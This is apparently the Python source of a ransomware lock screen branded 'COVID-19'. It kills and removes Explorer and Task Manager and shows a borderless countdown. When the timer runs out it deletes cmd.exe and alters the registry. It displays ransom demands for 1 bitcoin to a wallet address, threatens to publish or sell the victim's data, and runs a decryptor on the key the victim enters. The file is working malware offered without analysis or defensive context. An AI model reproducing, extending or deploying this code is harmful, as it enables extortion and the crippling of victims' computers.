#!/usr/bin/python
#coding:utf-8
from tkinter import *
from PIL import ImageTk, Image
import tkinter as tk
import os, timeps, time
from modules.system import regedit, delproc

# GET THE ENVIRONMENT VARIABLE
current_user = os.environ["USERNAME"]
letter_drive = os.environ["SystemDrive"]

# INITIATION OF VARIABLES TO CALL FUNCTIONS IN CLASSES
dk = delproc.Kill()
dr = delproc.Remove()
# TRY TO REMOVE EXPLORER IF NOT DELETED BEFORE
try:
    dk.exp()
    time.sleep(1)
    dr.exp()
    dr.tskmgr()
except:
    pass

# INIT WINDOW FOR GUI COUNTER
window = Tk()
# INSTRUCTION TO DISABLE THE HEADER WHO CONTAINS THE RESIZE, MINIMIZE AND EXIT WINDOW
window.overrideredirect(1)
# PATH TO DB.TXT FILE AND READ ID NUMBER
src = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\db.txt".format(letter_drive, current_user)
num = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\id".format(letter_drive, current_user)
with open(num, "r") as num:
    id = num.read()

# SET BACKGROUND FOR COUNTER TIME
canvas = Canvas(window, width=200, height=100, bg="red")
canvas.pack()
text_clock = canvas.create_text(100, 50)

# FUNCTION TO SET A TIME
def updateTime(generator):
    global p
    p = next(generator)
    canvas.itemconfigure(text_clock, text=p, font=(None, 35))
    window.after(1000, updateTime, generator)
    with open(src, "w") as db:
        db.write(p)
    x = open(src).read()
    if(x == "00:00:00"):
        try:
            delproc.power()
            os.remove("\\windows\\system32\\cmd.exe")
        except FileNotFoundError:
            pass
        except:
            pass
        regedit.delenv()
        regedit.delSpecRules()
        exit()

# INSTRUCTION MESSAGE
def instructions():
    txt = tk.Label(font="bold", text="\nYour computer is locked by the Ransomware COVID-19\n\n \
    To unlock your computer,\n \
    You have 24 HOURS to purchase 1 bitcoin and transfert it to this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()

# WARNING MESSAGE
def warning():
    wrn = tk.Label(font="bold", text="Warning !!!\n\
    Restarting your computer is USELESS\n\n\
    And if you restart your computer, a new encryption key will be generated,\n\
    then you will have to pay 1 bitcoin for each generated key,\n\
    then the time on the counter will be 12 hours less ...\n\
    And if you don't pay, your sensitive data will be pubished or sold.\n\n\
    Be sure of the key you insert after clicking on the 'Decrypt my data' button ...\n\
    You have only one chance.\n")
    wrn.pack()

# BUTTON PAYMENT ACTION
def pay():
    btn = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black", command=lambda:openNewWindowPayToKey())
    btn.pack(side=tk.BOTTOM)
def close_pay():
    newWindow.destroy()
# FUNCTION TO SPAWN NEW WINDOW FOR "PAY THE RANSOM"
def openNewWindowPayToKey():
    global newWindow
    newWindow = Toplevel(window)
    newWindow.title("Payment Instruction")
    newWindow.geometry("600x600")
    Label(newWindow, font="bold", text ="\n\nInstructions:\n\n \
    You must go to a crypto currency platform, such as coinpot.co, or coinbase.com.\n\n \
    You will need to create an account to be able to purchase 'Bitcoin', which you will use to pay for the Ransom.\n\n\
    When you are going to send the payment, you have to attach the ID number : {} in a comment.".format(id)).pack()
    # CREATE CANVAS FOR ENTRY BOX
    canvas1 = tk.Canvas(newWindow, width = 200, height = 100)
    canvas1.pack()
    # CREATE BUTTON TO CALL ACTION
    btn = tk.Button(newWindow, text="Close", font="bold", fg="red", bg="black", command=lambda:close_pay())
    btn.pack()

# BUTTON DECRYPT ACTION
def decrypt():
    btn = tk.Button(window, text="Decrypt Your Data", font="bold", fg="red", bg="black", command=lambda:openNewWindowDecrypt())
    btn.pack(side=tk.BOTTOM)
# BUTTON DECRYPT ACTION
def action_decrypt():
    prompt_user = entry1.get()
    create_key  = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\convert.key".format(letter_drive, current_user)
    with open(create_key, "w") as key:
        key.write(prompt_user)
    action = os.system("{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\vaccine.exe".format(letter_drive, current_user))
    newWindow.destroy()
# FUNCTION TO SPAWN NEW WINDOW FOR "DECRYPT YOUR DATA"
def openNewWindowDecrypt():
    global newWindow
    newWindow = Toplevel(window)
    newWindow.title("Vaccine of Covid-19")
    newWindow.geometry("400x200")
    Label(newWindow, font="bold", text ="\n\nType Your Key into input : ").pack()
    # CREATE CANVAS FOR ENTRY BOX
    canvas1 = tk.Canvas(newWindow, width = 200, height = 100)
    canvas1.pack()
    # CREATE ENTRY BOX
    global entry1
    entry1 = tk.Entry (newWindow)
    canvas1.create_window(100, 50, window=entry1)
    # CREATE BUTTON TO CALL ACTION
    btn = tk.Button(newWindow, text="Vaccine me", font="bold", fg="red", bg="black", command=lambda:action_decrypt())
    btn.pack()

# FUNCTION TO CONTROL IF DB.TXT EXIST
try:
    with open(src, "r") as db:
        db = db.read()
        db = db.split(":")
        hours = int(db[0])
        minutes = int(db[1])
        secondes = int(db[2])
        updateTime(timeps.set_time(hours, minutes, secondes))
except FileNotFoundError:
    with open(src, "w") as db:
        updateTime(timeps.set_time(24, 0, 0))
except:
    with open(src, "w") as db:
        updateTime(timeps.set_time(12, 0, 0))
try:
    a = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\assets\\image.jpg".format(letter_drive, current_user)
    # ADD IMAGE INTO WINDOW
    img = ImageTk.PhotoImage(Image.open(a))
    panel = tk.Label(window, image = img)
    panel.pack(side = "top", fill = "both", expand = "yes")
except FileNotFoundError:
    pass

# CALL EVERY FUNCTION INTO WINDOW
instructions()
warning()
pay()
decrypt()
window.mainloop()
